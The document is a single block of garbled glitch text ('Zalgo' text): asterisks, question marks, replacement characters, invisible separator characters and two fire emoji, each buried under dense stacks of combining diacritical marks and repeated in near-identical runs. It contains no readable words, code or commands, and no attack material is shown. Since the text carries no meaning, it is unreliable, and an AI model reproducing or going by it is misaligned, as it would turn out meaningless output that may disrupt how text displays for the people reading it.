̧̡̳̣̘͚̳⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̈́̾͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̆͂́̈́̿͌̈́̋͂͌͂̆̑̚͡͝͠